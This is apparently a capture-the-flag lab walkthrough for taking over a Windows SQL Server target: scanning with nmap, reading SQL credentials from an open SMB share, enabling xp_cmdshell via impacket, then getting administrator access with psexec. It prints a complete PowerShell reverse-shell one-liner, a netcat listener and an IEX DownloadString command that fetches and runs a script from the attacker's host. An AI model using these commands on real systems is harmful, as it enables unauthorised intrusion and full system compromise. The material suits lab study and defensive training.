0. Connect OpenVpn using generated file
1. nmap -sC -sV -p$ports [target ip] or Use openVas for detailed vulnerability 
2. Look 4 open ports
3. 445 and 1433 - google what service runs on port numbers
4. smbclient -N -L \\\\[target]\\ - list dir available
5. smbclient -N \\\\[target]\\dir
6. connected to DIR
7. check list of files
8. there is a file with SQL credentials (prod.dtsConfig)
9. download and install [impacket](https://github.com/SecureAuthCorp/impacket)
9.1 cd into the examples folder on impacket dir
10. use mssqlclient.py to connect to the db and enter pwd
11. on sql terminal -> SELECT IS_SRVROLEMEMBER('sysadmin') to check sql admin priviledges
12. [EXEC sp_configure 'Show Advanced Options', 1;
 reconfigure;
 sp_configure;
 EXEC sp_configure 'xp_cmdshell', 1
 reconfigure;
 xp_cmdshell "whoami"]

13. Results shows acct also running the same user
14.  Get a shell up or install one
$client = New-Object System.Net.Sockets.TCPClient("Machine IP",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
15. open port - nc -lvnp 443
16. ufw allow from target proto tcp to any port 80,443 
17. sudo python3 -m http.server 80 --machine IP
18. on Sql terminal ->
 xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://machine IP/shell.ps1\");" 
19. check frequent commands or files
 type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 
20. use Impacket's psexec.py to gain access as priviledged user from backup folder having admin rights from 19
21. from imapckets dir
psexec.py administrator@targetmachineip
22. Now with admin rights, we can move around and grab root flag from the desktop
 
